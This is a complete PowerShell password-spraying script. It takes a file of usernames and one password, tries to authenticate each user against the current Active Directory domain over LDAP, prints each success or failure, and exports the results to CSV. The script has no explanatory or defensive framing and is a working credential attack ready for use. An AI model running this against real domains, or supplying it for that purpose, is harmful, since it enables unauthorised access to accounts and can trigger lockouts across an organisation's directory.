param (
    [Parameter(Mandatory=$true, HelpMessage="Path to the usernames list file", Position=0)]
    [string]$ul,

    [Parameter(Mandatory=$true, HelpMessage="Password to be tested", Position=1)]
    [string]$p,

    [Parameter(Mandatory=$true, HelpMessage="Path to the output CSV file", Position=2)]
    [string]$o
)

$userList = Get-Content -Path $ul
$results = @()

foreach ($user in $userList) {
    $pass = ConvertTo-SecureString $p -AsPlainText -Force
    $plaintext = (New-Object System.Management.Automation.PSCredential 'N/A',$pass).GetNetworkCredential().Password
    $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
    $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$user,$plaintext)

    Write-Host "Checking credentials for $user..." -ForegroundColor Cyan
    
    if ($domain.name -eq $null){
        $output = "Fail"
        $message = "[-] Failed to authenticate $user with domain $CurrentDomain"
        Write-Host $message -ForegroundColor Red
    }
    else {
        $output = "Success"
        $message = "[*] Successfully authenticated $user with domain $CurrentDomain"
        Write-Host $message -ForegroundColor Green
    }
    
    $results += [PSCustomObject]@{
        Username = $user
        Status = $output
    }
}

$results | Export-Csv -Path $o -NoTypeInformation
